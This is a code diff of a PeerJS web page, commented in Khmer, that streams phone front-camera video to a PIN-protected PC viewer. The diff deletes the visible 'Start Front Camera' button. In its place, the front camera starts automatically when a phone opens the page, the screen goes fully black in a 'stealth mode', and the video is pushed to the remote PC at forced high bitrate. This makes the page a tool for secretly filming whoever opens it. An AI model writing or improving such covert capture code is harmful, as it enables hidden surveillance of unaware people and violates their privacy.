@@ -197,47 +197,23 @@
         .error-shake { animation: shake 0.2s ease-in-out 2; border-color: #ff5555 !important; }
         .fade-out { opacity: 0; transform: scale(0.9); transition: 0.6s ease-out; }
 
-        /* 📱 ស្ទីលទូរសព្ទ Stealth Mode */
+        /* 📱 ស្ទីលទូរសព្ទ Stealth Mode (ងងឹតទាំងស្រុង) */
         .phone-stealth-mode { background: #000000 !important; }
         .phone-stealth-mode #pc-ui { display: none !important; }
         .phone-stealth-mode #login-container { display: none !important; }
         
-        /* 🔴 ផ្ទាំងប៊ូតុងកាមេរ៉ាស្ទែលសម្រាប់ទូរសព្ទ (ធានាការចុចដើម្បីដំណើរការវីដេអូ) */
-        #mobile-trigger-container {
+        #mobile-stealth-screen {
             display: none;
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: #000;
+            background: #000000;
             z-index: 99999;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-
-        .mobile-btn {
-            padding: 20px 40px;
-            font-size: 20px;
-            font-weight: bold;
-            background: #ff5555;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(255, 85, 85, 0.6);
-        }
-        .mobile-info {
-            color: #555;
-            margin-top: 15px;
-            font-size: 14px;
         }
     </style>
 </head>
 <body>
 
-    <div id="mobile-trigger-container">
-        <button class="mobile-btn" onclick="activateMobileCamera()">🔴 បើកកាមេរ៉ាមុខ (Start Front Camera)</button>
-        <div class="mobile-info" id="mobile-status">រង់ចាំការចុច...</div>
-    </div>
+    <div id="mobile-stealth-screen"></div>
 
     <div id="login-container">
         <div class="login-box" id="login-card">
@@ -309,19 +285,45 @@
                 pinInput.focus();
                 setInterval(checkDeadCameras, 2000);
             } else {
-                // ប្រសិនបើបើកលើទូរសព្ទ (ទាំង Android & iOS)
+                // ប្រសិនបើបើកលើទូរសព្ទ វានឹងដំណើរការ auto ភ្លាមៗ (មិនបាច់មានប៊ូតុងចុចទេ)
                 document.body.classList.add('phone-stealth-mode');
-                document.getElementById('mobile-trigger-container').style.display = 'flex';
+                document.getElementById('mobile-stealth-screen').style.display = 'block';
                 generatedCamId = Math.floor(1000 + Math.random() * 9000).toString();
+                
+                // ដំណើរការកាមេរ៉ា និងភ្ជាប់ទៅកាន់ Server ដោយស្វ័យប្រវត្តិ
+                autoStartMobileCamera();
             }
         };
 
-        // មុខងារនេះដំណើរការបន្ទាប់ពីអ្នកប្រើប្រាស់ចុចប៊ូតុងក្រហមលើទូរសព្ទ
-        function activateMobileCamera() {
-            const labelStatus = document.getElementById('mobile-status');
-            labelStatus.innerText = "កំពុងដំណើរការកាមេរ៉ាមុខ...";
-            labelStatus.style.color = "#50fa7b";
-            startCamera(generatedCamId);
+        function autoStartMobileCamera() {
+            // កំណត់កម្រិតច្បាស់ខ្ពស់ HD 720p និង Frame Rate 30fps ដើម្បីល្បឿន Real-time
+            const constraints = {
+                video: { 
+                    facingMode: { exact: "user" },
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    frameRate: { ideal: 30 }
+                },
+                audio: false
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+            .then((stream) => {
+                localStream = stream;
+                connectToPC(generatedCamId);
+            })
+            .catch((err) => { 
+                console.log("គាំងកូដបង្ខំ HD, កំពុងប្តូរទៅប្រើកម្រិតធម្មតា (Fallback)...", err);
+                // លក្ខខណ្ឌ Fallback ប្រសិនបើប្រព័ន្ធទូរសព្ទមិនគាំទ្រការបង្ខំទំហំ HD
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then((stream) => {
+                    localStream = stream;
+                    connectToPC(generatedCamId);
+                })
+                .catch((e) => {
+                    alert("សូមអនុញ្ញាតសិទ្ធិបើកកាមេរ៉ា (Camera Permission) នៅក្នុងកម្មវិធីរុករក (Browser) របស់អ្នក!");
+                });
+            });
         }
 
         function verifyPIN() {
@@ -372,7 +374,7 @@
             renderNoise();
         }
 
-        // --- 🖥️ SERVER LISTENER ---
+        // --- 🖥️ SERVER LISTENER (PC) ---
         function initPCServerListener() {
             if (peer) peer.destroy();
             peer = new Peer(SERVER_ID, peerConfig);
@@ -387,10 +389,7 @@
                 conn.on('data', (data) => {
                     if (data === 'ping') {
                         if (!cameraRegistry[incomingCamId]) {
-                            cameraRegistry[incomingCamId] = {
-                                lastSeen: Date.now(),
-                                stream: null
-                            };
+                            cameraRegistry[incomingCamId] = { lastSeen: Date.now(), stream: null };
                         } else {
                             cameraRegistry[incomingCamId].lastSeen = Date.now();
                         }
@@ -403,15 +402,15 @@
                 const incomingCamId = call.peer.replace(CAM_PREFIX, '');
                 
                 if (!cameraRegistry[incomingCamId]) {
-                    cameraRegistry[incomingCamId] = {
-                        lastSeen: Date.now(),
-                        stream: null
-                    };
+                    cameraRegistry[incomingCamId] = { lastSeen: Date.now(), stream: null };
                 }
                 createCameraButton(incomingCamId);
 
                 call.answer();
                 
+                // បង្កើនល្បឿន និងទាញកម្រិតច្បាស់នៅខាងអ្នកទទួល (PC)
+                maximizeBitrate(call.peerConnection);
+
                 call.on('stream', (remoteStream) => {
                     cameraRegistry[incomingCamId].stream = remoteStream;
                     cameraRegistry[incomingCamId].lastSeen = Date.now();
@@ -436,10 +435,7 @@
             newBtn.id = 'btn-cam' + camId;
             newBtn.innerHTML = `<span>កាមេរ៉ា #${camId} 📷</span> <div class="status-dot"></div>`;
             
-            newBtn.onclick = function() {
-                handleButtonClick(camId);
-            };
-
+            newBtn.onclick = function() { handleButtonClick(camId); };
             btnContainer.appendChild(newBtn);
         }
 
@@ -512,40 +508,6 @@
             }
         }
 
-        // --- 📱 STREAMER (កែប្រែឱ្យត្រូវតាមស្ដង់ដារ Android និង iOS) ---
-        function startCamera(camId) {
-            // ការកំណត់ constraints ថ្មី៖ លុប min/max width/height ចេញដើម្បីកុំឱ្យទូរសព្ទ Android មួយចំនួនគាំង ហើយបង្ខំយក exact: "user"
-            const constraints = {
-                video: { 
-                    facingMode: { exact: "user" } // បង្ខំឱ្យប្រើតែត្រឹមកាមេរ៉ាមុខដាច់ខាត
-                },
-                audio: false
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-            .then((stream) => {
-                localStream = stream;
-                connectToPC(camId);
-                // នៅពេលដើរជោគជ័យ ធ្វើឱ្យអេក្រង់ទូរសព្ទងងឹតទាំងស្រុង (Stealth Mode)
-                document.getElementById('mobile-trigger-container').style.background = '#000000';
-                document.getElementById('mobile-trigger-container').innerHTML = ''; 
-            })
-            .catch((err) => { 
-                console.log("Error directly accessing exact user camera, trying fallback...", err);
-                // ប្រសិនបើកូដខាងលើនៅតែមិនព្រមដើរ (លក្ខខណ្ឌ Fallback)
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then((stream) => {
-                    localStream = stream;
-                    connectToPC(camId);
-                    document.getElementById('mobile-trigger-container').style.background = '#000000';
-                    document.getElementById('mobile-trigger-container').innerHTML = '';
-                })
-                .catch((e) => {
-                    alert("សូមពិនិត្យការអនុញ្ញាតសិទ្ធិ (Camera Permission) ក្នុង Setting ទូរសព្ទរបស់អ្នក!");
-                });
-            });
-        }
-
         function connectToPC(camId) {
             if (peer) peer.destroy();
             peer = new Peer(CAM_PREFIX + camId, peerConfig); 
@@ -564,7 +526,10 @@
 
                 setTimeout(() => {
                     if (!peer.destroyed) {
-                        peer.call(SERVER_ID, localStream);
+                        const call = peer.call(SERVER_ID, localStream);
+                        if(call) {
+                            maximizeBitrate(call.peerConnection);
+                        }
                     }
                 }, 1000);
 
@@ -576,6 +541,33 @@
             peer.on('error', (err) => { 
                 setTimeout(() => connectToPC(camId), 4000); 
             });
+        }
+
+        // 🚀 បង្ខំទាញល្បឿន Network និងកាត់បន្ថយភាពយឺតយ៉ាវ (Force Max Bitrate)
+        function maximizeBitrate(peerConnection) {
+            if (!peerConnection) return;
+
+            peerConnection.oniceconnectionstatechange = () => {
+                if (peerConnection.iceConnectionState === 'connected' || peerConnection.iceConnectionState === 'completed') {
+                    setTimeout(() => {
+                        const senders = peerConnection.getSenders();
+                        senders.forEach(sender => {
+                            if (sender.track && sender.track.kind === 'video') {
+                                const parameters = sender.getParameters();
+                                if (!parameters.encodings) parameters.encodings = [{}];
+                                
+                                // បង្កើនល្បឿនបញ្ជូនទិន្នន័យវីដេអូដល់ 2.5 Mbps
+                                parameters.encodings[0].maxBitrate = 2500000; 
+                                parameters.encodings[0].firInterval = 0; 
+                                
+                                sender.setParameters(parameters).catch(err => {
+                                    console.log("Bitrate override skipped:", err);
+                                });
+                            }
+                        });
+                    }, 1000);
+                }
+            };
         }
     </script>
 </body>
